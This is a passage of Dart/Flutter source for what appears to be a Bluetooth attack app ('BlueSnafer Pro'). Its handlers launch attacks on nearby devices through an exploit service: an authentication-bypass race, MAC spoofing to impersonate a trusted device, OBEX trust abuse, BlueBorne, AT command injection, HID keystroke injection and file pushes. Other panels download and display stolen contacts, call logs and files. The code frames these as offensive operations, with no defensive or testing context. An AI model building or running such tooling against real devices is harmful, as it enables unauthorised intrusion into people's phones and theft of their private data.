                backgroundColor: Colors.orange[900],
                duration: const Duration(seconds: 6),
                behavior: SnackBarBehavior.floating,
              ),
            );
          }
        }
      }
    } catch (e) {
      _appendLog('💥 PBAP Error: $e');
    }
  }

  // ========== OPP FILE PUSH ==========

  Future<void> _oppPushFile() async {
    if (!mounted) return;
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);

    // Show file picker dialog
    final selectedPath = await showDialog<String>(
      context: context,
      builder: (dialogContext) => AlertDialog(
        title: const Text('Seleccionar archivo'),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            _buildFileOption('/storage/emulated/0/Download/test.txt', 'Downloads/test.txt'),
            _buildFileOption('/storage/emulated/0/DCIM/Camera/photo.jpg', 'DCIM/photo.jpg'),
            _buildFileOption('/storage/emulated/0/Documents/doc.pdf', 'Documents/doc.pdf'),
            const SizedBox(height: 8),
            const Text('O ingresa ruta personalizada:', style: TextStyle(color: Colors.white70, fontSize: 12)),
            const SizedBox(height: 8),
            TextField(
              decoration: const InputDecoration(
                hintText: '/ruta/personalizada/archivo.txt',
                border: OutlineInputBorder(),
                contentPadding: EdgeInsets.symmetric(horizontal: 8, vertical: 4),
              ),
              style: const TextStyle(fontSize: 12),
              onSubmitted: (value) {
                Navigator.pop(dialogContext, value);
              },
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(dialogContext),
            child: const Text('Cancelar'),
          ),
        ],
      ),
    );

    if (!mounted) return;
    if (selectedPath == null || selectedPath.isEmpty) return;

    _appendLog('📤 OPP Push → $displayName ($selectedPath)');
    _appendLog('⏳ Enviando archivo via OBEX OPP...');

    try {
      final result = await _exploitService.oppPush(_selectedDevice!['address'], selectedPath);

      if (result['success'] == true) {
        _appendLog('✅ OPP: Archivo enviado - ${result['fileName']} (${result['fileSize']} bytes)');
        _collectedData.add('📤 [$displayName] Archivo enviado: ${result['fileName']} (${result['fileSize']} bytes)');
        if (mounted) {
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Text('📤 Archivo enviado: ${result['fileName']} (${result['fileSize']} bytes)', style: const TextStyle(fontSize: 12)),
              backgroundColor: Colors.purple[900],
              duration: const Duration(seconds: 3),
              behavior: SnackBarBehavior.floating,
            ),
          );
        }
      } else {
        _appendLog('❌ OPP fallido: ${result['message']}');
      }
    } catch (e) {
      _appendLog('💥 OPP Error: $e');
    }
  }

  Widget _buildFileOption(String path, String label) {
    return ListTile(
      dense: true,
      contentPadding: EdgeInsets.zero,
      leading: const Icon(Icons.insert_drive_file, size: 16, color: Colors.cyanAccent),
      title: Text(label, style: const TextStyle(color: Colors.white, fontSize: 12)),
      subtitle: Text(path, style: const TextStyle(color: Colors.white38, fontSize: 9)),
      onTap: () => Navigator.pop(context, path),
    );
  }

  // ========== AUTHENTICATION BYPASS HANDLERS ==========

  Future<void> _bypassQuickConnect() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    _appendLog('⚡ Quick Connect Race → $displayName');
    _appendLog('⏳ Attempting race condition attack...');

    try {
      final result = await _exploitService.bypassQuickConnect(
        _selectedDevice!['address'],
      );

      if (result['success'] == true) {
        _appendLog('✅ BYPASS SUCCESS! Response: ${result['responseCode']}');
        _collectedData.add('⚡ [$displayName] Quick Connect bypass succeeded (${result['method']})');
        if (mounted) {
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Text('⚡ Auth bypass succeeded on $displayName!', style: const TextStyle(fontSize: 12)),
              backgroundColor: Colors.red[900],
              duration: const Duration(seconds: 4),
              behavior: SnackBarBehavior.floating,
            ),
          );
        }
      } else {
        _appendLog('❌ Quick Connect bypass failed: ${result['error'] ?? result['message'] ?? 'unknown'}');
      }
    } catch (e) {
      _appendLog('💥 Quick Connect Error: $e');
    }
  }

  Future<void> _bypassSpoofDevice() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    final targetMac = _selectedDevice!['address']?.toString() ?? '';
    _appendLog('🎭 MAC Spoof Trust → $displayName ($targetMac)');
    _appendLog('⏳ Attempting to impersonate trusted device...');

    try {
      final result = await _exploitService.bypassSpoofDevice(targetMac);

      if (result['success'] == true) {
        _appendLog('✅ SPOOF SUCCESS! Trust level: ${result['trustLevel']}');
        _collectedData.add('🎭 [$displayName] MAC spoof succeeded (${result['trustLevel']})');
        if (mounted) {
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Text('🎭 Device trust established: ${result['trustLevel']}', style: const TextStyle(fontSize: 12)),
              backgroundColor: Colors.deepPurple[900],
              duration: const Duration(seconds: 4),
              behavior: SnackBarBehavior.floating,
            ),
          );
        }
      } else {
        _appendLog('❌ MAC spoof failed: ${result['error'] ?? result['message'] ?? 'unknown'}');
      }
    } catch (e) {
      _appendLog('💥 MAC Spoof Error: $e');
    }
  }

  Future<void> _bypassOBEXTrust() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    _appendLog('🔓 OBEX Trust Abuse → $displayName');
    _appendLog('⏳ Testing unauthenticated OBEX access...');

    try {
      final result = await _exploitService.bypassOBEXTrust(
        _selectedDevice!['address'],
      );

      if (result['success'] == true) {
        _appendLog('✅ OBEX TRUST ABUSE! Profile: ${result['profile']}, Trust: ${result['trustLevel']}');
        if (result['dataAccessPossible'] == true) {
          _appendLog('⚠️ DATA ACCESS possible without authentication!');
        }
        _collectedData.add('🔓 [$displayName] OBEX trust abuse (${result['profile']} - ${result['trustLevel']})');
        if (mounted) {
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Text('🔓 OBEX auth bypass on $displayName! Profile: ${result['profile']}', style: const TextStyle(fontSize: 12)),
              backgroundColor: Colors.orange[900],
              duration: const Duration(seconds: 4),
              behavior: SnackBarBehavior.floating,
            ),
          );
        }
      } else {
        _appendLog('❌ OBEX trust abuse failed: ${result['error'] ?? result['message'] ?? 'unknown'}');
      }
    } catch (e) {
      _appendLog('💥 OBEX Trust Error: $e');
    }
  }

  // ====== NUEVOS: Advanced exploit handlers ======
  Future<void> _blueBorneAttack() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    _appendLog('🦠 BlueBorne → $displayName');
    try {
      final result = await _exploitService.executeAttack(
        deviceAddress: _selectedDevice!['address'],
        type: 'blueborne',
      );
      if (result['success'] == true) {
        final isVuln = result['vulnerable'] == true;
        _appendLog('✅ BlueBorne: ${result['message']}');
        _collectedData.add('🦠 [$displayName] BlueBorne: ${isVuln ? "VULNERABLE" : "Parcheado"}');
        
        // Store full structured result
        _blueBorneResults.add({
          'device': displayName,
          'address': _selectedDevice!['address'],
          'vulnerable': isVuln,
          'riskLevel': result['risk'] ?? 'UNKNOWN',
          'cves': result['cves'] ?? [],
          'exposedServices': result['exposedServices'] ?? [],
          'message': result['message'] ?? '',
          'timestamp': DateTime.now().toIso8601String(),
        });
        _saveState(); // Persist BlueBorne results
      } else {
        _appendLog('❌ BlueBorne fallido: ${result['message']}');
      }
    } catch (e) { _appendLog('💥 BlueBorne Error: $e'); }
  }

  Future<void> _mirrorProfile() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    _appendLog('📡 Mirror Profile → $displayName');
    try {
      final result = await _exploitService.executeAttack(
        deviceAddress: _selectedDevice!['address'],
        type: 'mirror_profile',
      );
      if (result['success'] == true) {
        final services = result['services'] as List? ?? [];
        final count = result['count'] ?? result['serviceCount'] ?? services.length;
        _appendLog('✅ Mirror: $count servicios clonados');
        _collectedData.add('📡 [$displayName] $count servicios GATT clonados');
        
        // Store full GATT tree
        _gattMirrorResults.add({
          'device': displayName,
          'address': _selectedDevice!['address'],
          'serviceCount': count,
          'services': services,
          'timestamp': DateTime.now().toIso8601String(),
        });
        _saveState(); // Persist GATT mirror results
      } else { _appendLog('❌ Mirror fallido: ${result['message']}'); }
    } catch (e) { _appendLog('💥 Mirror Error: $e'); }
  }

  Future<void> _atInjection() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    _appendLog('💉 AT Injection → $displayName');
    try {
      final result = await _exploitService.executeAttack(
        deviceAddress: _selectedDevice!['address'],
        type: 'at_injection',
      );
      if (result['success'] == true) {
        final msg = result['message'] ?? 'AT injection OK';
        final atResults = result['results'] as List? ?? [];
        _appendLog('✅ AT: $msg');
        _collectedData.add('💉 [$displayName] $msg');
        
        // Store AT responses
        _atInjectionResults.add({
          'device': displayName,
          'address': _selectedDevice!['address'],
          'commands': atResults,
          'message': msg,
          'timestamp': DateTime.now().toIso8601String(),
        });
        _saveState(); // Persist AT injection results
      } else { _appendLog('❌ AT fallido: ${result['message']}'); }
    } catch (e) { _appendLog('💥 AT Error: $e'); }
  }

  Future<void> _fullScan() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    _appendLog('🔎 Full Vuln Scan → $displayName');
    try {
      final result = await _exploitService.executeAttack(
        deviceAddress: _selectedDevice!['address'],
        type: 'full_scan',
      );
      if (result['success'] == true) {
        final risk = result['riskLevel'] ?? 'UNKNOWN';
        final vulns = result['vulnCount'] ?? 0;
        final vulnerabilities = result['vulnerabilities'] as List? ?? [];
        final sdpUuids = result['sdpUuids'] as List? ?? [];
        final gattServices = result['gattServices'] as List? ?? [];
        _appendLog('✅ Scan: $risk risk, $vulns vulns');
        _collectedData.add('🔎 [$displayName] Risk: $risk, $vulns vulnerabilities');
        
        // Store full scan results
        _fullScanResults.add({
          'device': displayName,
          'address': _selectedDevice!['address'],
          'riskLevel': risk,
          'vulnCount': vulns,
          'vulnerabilities': vulnerabilities,
          'sdpUuids': sdpUuids,
          'gattServices': gattServices,
          'obexAvailable': result['obexAvailable'] ?? false,
          'timestamp': DateTime.now().toIso8601String(),
        });
        _saveState(); // Persist full scan results
      } else { _appendLog('❌ Scan fallido: ${result['message']}'); }
    } catch (e) { _appendLog('💥 Scan Error: $e'); }
  }

  Future<void> _btSpoofing() async {
    if (_selectedDevice == null) return;
    _appendLog('🎭 BT Spoofing...');
    try {
      final result = await _exploitService.executeAttack(
        deviceAddress: _selectedDevice!['address'],
        type: 'spoofing',
        command: 'BlueSnafer Pro',
      );
      if (result['success'] == true) {
        _appendLog('✅ Spoofing OK');
      } else { _appendLog('❌ Spoofing fallido'); }
    } catch (e) { _appendLog('💥 Spoofing Error: $e'); }
  }

  Future<void> _hidInject() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    _appendLog('⌨️ HID Inject → $displayName');
    try {
      final result = await _exploitService.executeAttack(
        deviceAddress: _selectedDevice!['address'],
        type: 'hid_inject',
      );
      if (result['success'] == true) {
        _appendLog('✅ HID injection OK');
        _collectedData.add('⌨️ [$displayName] Keystroke injected');
      } else { _appendLog('❌ HID fallido'); }
    } catch (e) { _appendLog('💥 HID Error: $e'); }
  }

  Future<void> _downloadFile() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    _appendLog('📥 Download file...');
    try {
      final result = await _exploitService.downloadFile(
        _selectedDevice!['address'],
        'contacts.vcf',
      );
      if (result['success'] == true) {
        final path = result['path'] ?? result['fileName'] ?? 'saved';
        final size = result['size'] ?? 0;
        _appendLog('✅ Download OK: $path ($size bytes)');
        _collectedData.add('📥 [$displayName] Archivo descargado: $path ($size bytes)');
        _saveState();
        
        // Show user-friendly confirmation
        if (mounted) {
          showDialog(
            context: context,
            builder: (context) => AlertDialog(
              title: const Text('✅ Descarga completada'),
              content: Column(
                mainAxisSize: MainAxisSize.min,
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text('Archivo: ${result['fileName'] ?? 'contacts.vcf'}'),
                  const SizedBox(height: 4),
                  Text('Tamaño: $size bytes'),
                  const SizedBox(height: 8),
                  const Text('📁 Ubicación: Carpeta Descargas del dispositivo', style: TextStyle(color: Colors.white60, fontSize: 12)),
                ],
              ),
              actions: [
                TextButton(onPressed: () => Navigator.pop(context), child: const Text('OK')),
              ],
            ),
          );
        }
      } else { 
        _appendLog('❌ Download fallido: ${result['message']}'); 
      }
    } catch (e) { _appendLog('💥 Download Error: $e'); }
  }

  // ========== UI BUILDERS ==========

  // Tarjeta informativa + EJECUTABLE: al pulsar ejecuta la técnica real
  Widget _buildAutoRunCard(String title, String subtitle, {VoidCallback? onTap}) {
    return Material(
      color: Colors.transparent,
      child: InkWell(
        borderRadius: BorderRadius.circular(12),
        onTap: onTap,
        child: Container(
          width: double.infinity,
          padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 10),
          decoration: BoxDecoration(
            color: Colors.greenAccent.withValues(alpha: 0.06),
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: onTap != null ? Colors.greenAccent.withValues(alpha: 0.6) : Colors.greenAccent.withValues(alpha: 0.3)),
          ),
          child: Row(
            children: [
              Icon(onTap != null ? Icons.play_circle_fill : Icons.auto_mode, color: onTap != null ? Colors.greenAccent : Colors.greenAccent, size: onTap != null ? 20 : 18),
              const SizedBox(width: 10),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(title, style: const TextStyle(color: Colors.greenAccent, fontWeight: FontWeight.bold, fontSize: 12)),
                    const SizedBox(height: 2),
                    Text(subtitle, style: const TextStyle(color: Colors.white38, fontSize: 10)),
                  ],
                ),
              ),
              if (onTap != null) const Icon(Icons.touch_app, color: Colors.greenAccent, size: 14),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildAutoRunAction(String actions, String note, {VoidCallback? onTap, IconData? icon}) {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.indigoAccent.withValues(alpha: 0.06),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: onTap != null ? Colors.indigoAccent.withValues(alpha: 0.6) : Colors.indigoAccent.withValues(alpha: 0.25)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(icon ?? Icons.auto_mode, color: Colors.indigoAccent, size: onTap != null ? 20 : 16),
              const SizedBox(width: 8),
              Expanded(
                child: Text(actions,
                    style: const TextStyle(color: Colors.white70, fontSize: 11, fontWeight: FontWeight.w600)),
              ),
              if (onTap != null) const Icon(Icons.touch_app, color: Colors.indigoAccent, size: 14),
            ],
          ),
          const SizedBox(height: 4),
          Text(note, style: const TextStyle(color: Colors.white30, fontSize: 10)),
        ],
      ),
    );
  }

  Widget _buildExploitCard(String title, String subtitle, IconData icon, Color color, VoidCallback? onTap) {
    return Card(
      child: ListTile(
        leading: Container(
          padding: const EdgeInsets.all(10),
          decoration: BoxDecoration(color: color.withValues(alpha: 0.1), borderRadius: BorderRadius.circular(12)),
          child: Icon(icon, color: color, size: 24),
        ),
        title: Text(title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 13), maxLines: 1, overflow: TextOverflow.ellipsis),
        subtitle: Text(subtitle, style: const TextStyle(color: Colors.white24, fontSize: 10)),
        trailing: onTap != null
            ? Container(
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: color.withValues(alpha: 0.1),
                  borderRadius: BorderRadius.circular(100),
                  border: Border.all(color: color.withValues(alpha: 0.5)),
                ),
                child: Icon(Icons.bolt, color: color, size: 16),
              )
            : null,
        onTap: onTap,
      ),
    );
  }

  Widget _buildSDPResultsPanel() {
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.cyan[900]!.withValues(alpha: 0.2),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: Colors.cyanAccent.withValues(alpha: 0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.search, color: Colors.cyanAccent, size: 16),
              const SizedBox(width: 8),
              Text('${_sdpServices.length} servicios descubiertos', style: const TextStyle(color: Colors.cyanAccent, fontWeight: FontWeight.bold, fontSize: 12)),
            ],
          ),
          const SizedBox(height: 8),
          ..._sdpServices.take(15).map((s) => Padding(
            padding: const EdgeInsets.only(bottom: 2),
            child: Row(
              children: [
                Icon(Icons.bluetooth, color: Colors.cyanAccent, size: 10),
                const SizedBox(width: 4),
                Expanded(
                  child: Text(
                    s['serviceName']?.toString() ?? 'Unknown',
                    style: const TextStyle(color: Colors.white70, fontSize: 10, fontFamily: 'monospace'),
                    overflow: TextOverflow.ellipsis,
                  ),
                ),
                Text(
                  (s['uuid']?.toString() ?? '').length >= 8
                      ? (s['uuid']!.toString().substring(0, 8))
                      : (s['uuid']?.toString() ?? ''),
                  style: const TextStyle(color: Colors.white38, fontSize: 9, fontFamily: 'monospace'),
                  overflow: TextOverflow.ellipsis,
                ),
              ],
            ),
          )),
          if (_sdpServices.length > 15)
            Padding(
              padding: const EdgeInsets.only(top: 4),
              child: Text('... y ${_sdpServices.length - 15} mas', style: const TextStyle(color: Colors.white38, fontSize: 9)),
            ),
        ],
      ),
    );
  }

  Widget _buildPBAPResultsPanel() {
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.orange[900]!.withValues(alpha: 0.2),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: Colors.orangeAccent.withValues(alpha: 0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          if (_pbapContacts.isNotEmpty) ...[
            Row(
              children: [
                Icon(Icons.contacts, color: Colors.orangeAccent, size: 16),
                const SizedBox(width: 8),
                Text('${_pbapContacts.length} contactos extraidos', style: const TextStyle(color: Colors.orangeAccent, fontWeight: FontWeight.bold, fontSize: 12)),
              ],
            ),
            const SizedBox(height: 8),
            ..._pbapContacts.take(10).map((c) => Padding(
              padding: const EdgeInsets.only(bottom: 2),
              child: Row(
                children: [
                  Icon(Icons.person, color: Colors.orangeAccent, size: 10),
                  const SizedBox(width: 4),
                  Expanded(
                    child: Text(
                      c['name']?.toString() ?? c['phone']?.toString() ?? '?',
                      style: const TextStyle(color: Colors.white70, fontSize: 10, fontFamily: 'monospace'),
                      overflow: TextOverflow.ellipsis,
                    ),
                  ),
                  if (c['phone'] != null)
                    Flexible(
                      child: Text(c['phone']!, style: const TextStyle(color: Colors.white38, fontSize: 9), overflow: TextOverflow.ellipsis, maxLines: 1),
                    ),
                ],
              ),
            )),
            if (_pbapContacts.length > 10)
              Padding(
                padding: const EdgeInsets.only(top: 4),
                child: Text('... y ${_pbapContacts.length - 10} mas', style: const TextStyle(color: Colors.white38, fontSize: 9)),
              ),
            const SizedBox(height: 12),
          ],
          if (_pbapCalls.isNotEmpty) ...[
            Row(
              children: [
                Icon(Icons.phone, color: Colors.deepOrange, size: 16),
                const SizedBox(width: 8),
                Text('${_pbapCalls.length} llamadas extraidas', style: const TextStyle(color: Colors.deepOrange, fontWeight: FontWeight.bold, fontSize: 12)),
              ],
            ),
            const SizedBox(height: 8),
            ..._pbapCalls.take(10).map((c) => Padding(
              padding: const EdgeInsets.only(bottom: 2),
              child: Row(
                children: [
                  Icon(
                    c['type'] == 'incoming' ? Icons.call_received :
                    c['type'] == 'outgoing' ? Icons.call_made :
                    Icons.call_missed,
                    color: Colors.deepOrange, size: 10,
                  ),
                  const SizedBox(width: 4),
                  Expanded(
                    child: Text(
                      c['name']?.toString() ?? c['phone']?.toString() ?? '?',
                      style: const TextStyle(color: Colors.white70, fontSize: 10, fontFamily: 'monospace'),
                      overflow: TextOverflow.ellipsis,
                    ),
                  ),
                  if (c['phone'] != null)
                    Flexible(
                      child: Text(c['phone']!, style: const TextStyle(color: Colors.white38, fontSize: 9), overflow: TextOverflow.ellipsis, maxLines: 1),
                    ),
                  if (c['datetime'] != null)
                    Padding(
                      padding: const EdgeInsets.only(left: 4),
                      child: Text(c['datetime']!, style: const TextStyle(color: Colors.white38, fontSize: 8)),
                    ),
                ],
              ),
            )),
            if (_pbapCalls.length > 10)
              Padding(
                padding: const EdgeInsets.only(top: 4),
                child: Text('... y ${_pbapCalls.length - 10} mas', style: const TextStyle(color: Colors.white38, fontSize: 9)),
              ),
          ],
        ],
      ),
    );
  }

  Widget _buildSectionTitle(String title, String subtitle) {
    return Column(crossAxisAlignment: CrossAxisAlignment.start, children: [Text(title, style: const TextStyle(color: Colors.indigoAccent, fontSize: 16, fontWeight: FontWeight.bold, letterSpacing: 1)), Text(subtitle, style: const TextStyle(color: Colors.white24, fontSize: 10, fontFamily: 'monospace')), const SizedBox(height: 12), Container(height: 1, color: Colors.white.withValues(alpha: 0.05))]);
  }

  Widget _buildAttackCard(String title, String subtitle, Color color, VoidCallback onTap, {String? type}) {
    double prob = 0.5;
    bool recommended = false;
    if (type != null && _successRates.containsKey(type)) prob = _successRates[type]!;
    if (_currentSuggestion != null && type == _currentSuggestion!.type) recommended = true;
    final bool isViable = prob > 0.2;

    return Opacity(
      opacity: isViable ? 1.0 : 0.4,
      child: Container(
        margin: const EdgeInsets.only(bottom: 12),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(16),
          boxShadow: recommended ? [BoxShadow(color: Colors.cyanAccent.withValues(alpha: 0.1), blurRadius: 8, spreadRadius: 1)] : null,
        ),
        child: Card(
          margin: EdgeInsets.zero,
          child: ListTile(
            contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
            title: Row(children: [
              Expanded(child: Text(title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 13), maxLines: 1, overflow: TextOverflow.ellipsis)),
              if (recommended) ...[const SizedBox(width: 8), Container(padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2), decoration: BoxDecoration(color: Colors.cyanAccent.withValues(alpha: 0.2), borderRadius: BorderRadius.circular(4)), child: const Text('ÓPTIMO', style: TextStyle(color: Colors.cyanAccent, fontSize: 8, fontWeight: FontWeight.bold)))]
            ]),
            subtitle: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const SizedBox(height: 4),
                Text(subtitle, style: const TextStyle(color: Colors.white24, fontSize: 10)),
                const SizedBox(height: 8),
                Row(children: [
                  Expanded(child: ClipRRect(borderRadius: BorderRadius.circular(2), child: LinearProgressIndicator(value: prob, backgroundColor: Colors.white.withValues(alpha: 0.05), valueColor: AlwaysStoppedAnimation<Color>(prob > 0.7 ? Colors.greenAccent : (prob > 0.4 ? Colors.cyanAccent : Colors.white30)), minHeight: 4))),
                  const SizedBox(width: 8),
                  Text(
                    '${(prob * 100).toInt()}%',
                    style: const TextStyle(color: Colors.white38, fontSize: 10, fontWeight: FontWeight.bold),
                  ),
                ]),
              ],
            ),
            trailing: Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: color.withValues(alpha: 0.1), borderRadius: BorderRadius.circular(100), border: Border.all(color: color.withValues(alpha: recommended ? 0.8 : 0.2))), child: Icon(Icons.bolt, color: color, size: 16)),
            onTap: _selectedDevice == null ? null : (isViable ? onTap : null),
          ),
        ),
      ),
    );
  }

  // ====== RESULTS DASHBOARD ======
  bool _hasResults() {
    return _sdpServices.isNotEmpty || _obexFiles.isNotEmpty || 
           _pbapContacts.isNotEmpty || _pbapCalls.isNotEmpty ||
           _blueBorneResults.isNotEmpty || _gattMirrorResults.isNotEmpty ||
           _fullScanResults.isNotEmpty || _atInjectionResults.isNotEmpty ||
           _gattDump.isNotEmpty;
  }

  Widget _buildResultsDashboard() {
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.green[900]!.withValues(alpha: 0.2),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: Colors.greenAccent.withValues(alpha: 0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.storage, color: Colors.greenAccent, size: 16),
              const SizedBox(width: 8),
              const Text('DATOS EXTRAÍDOS', style: TextStyle(color: Colors.greenAccent, fontWeight: FontWeight.bold, fontSize: 12)),
            ],
          ),
          const SizedBox(height: 8),
          Wrap(
            spacing: 8,
            runSpacing: 8,
            children: [
              if (_sdpServices.isNotEmpty) _buildResultChip('🔍 SDP', _sdpServices.length),
              if (_obexFiles.isNotEmpty) _buildResultChip('📂 OBEX', _obexFiles.length),
              if (_pbapContacts.isNotEmpty) _buildResultChip('📇 Contactos', _pbapContacts.length),
              if (_pbapCalls.isNotEmpty) _buildResultChip('📞 Llamadas', _pbapCalls.length),
              if (_blueBorneResults.isNotEmpty) _buildResultChip('🦠 BlueBorne', _blueBorneResults.length),
              if (_gattMirrorResults.isNotEmpty) _buildResultChip('📡 GATT', _gattMirrorResults.length),
              if (_fullScanResults.isNotEmpty) _buildResultChip('🔎 Scan', _fullScanResults.length),
              if (_atInjectionResults.isNotEmpty) _buildResultChip('💉 AT', _atInjectionResults.length),
            ],
          ),
          if (_blueBorneResults.isNotEmpty) ...[
            const SizedBox(height: 8),
            const Text('Último BlueBorne:', style: TextStyle(color: Colors.white60, fontSize: 10)),
            Text(_blueBorneResults.last['vulnerable'] == true ? '⚠️ VULNERABLE' : '✅ Parcheado',
              style: TextStyle(color: _blueBorneResults.last['vulnerable'] == true ? Colors.redAccent : Colors.greenAccent, fontSize: 11, fontWeight: FontWeight.bold)),
          ],
          if (_fullScanResults.isNotEmpty) ...[
            const SizedBox(height: 4),
            const Text('Último Scan:', style: TextStyle(color: Colors.white60, fontSize: 10)),
            Text('Riesgo: ${_fullScanResults.last['riskLevel']} (${_fullScanResults.last['vulnCount']} vulns)',
              style: const TextStyle(color: Colors.white70, fontSize: 11)),
          ],
          if (_pbapContacts.isNotEmpty) ...[
            const SizedBox(height: 4),
            const Text('Contactos:', style: TextStyle(color: Colors.white60, fontSize: 10)),
            Text('${_pbapContacts.length} contactos extraídos', style: const TextStyle(color: Colors.cyanAccent, fontSize: 11)),
          ],
        ],
      ),
    );
  }

  Widget _buildResultChip(String label, int count) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
      decoration: BoxDecoration(
        color: Colors.white10,
        borderRadius: BorderRadius.circular(12),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Text(label, style: const TextStyle(color: Colors.white70, fontSize: 10)),
          const SizedBox(width: 4),
          Text('$count', style: const TextStyle(color: Colors.greenAccent, fontSize: 10, fontWeight: FontWeight.bold)),
        ],
      ),
    );
  }
}
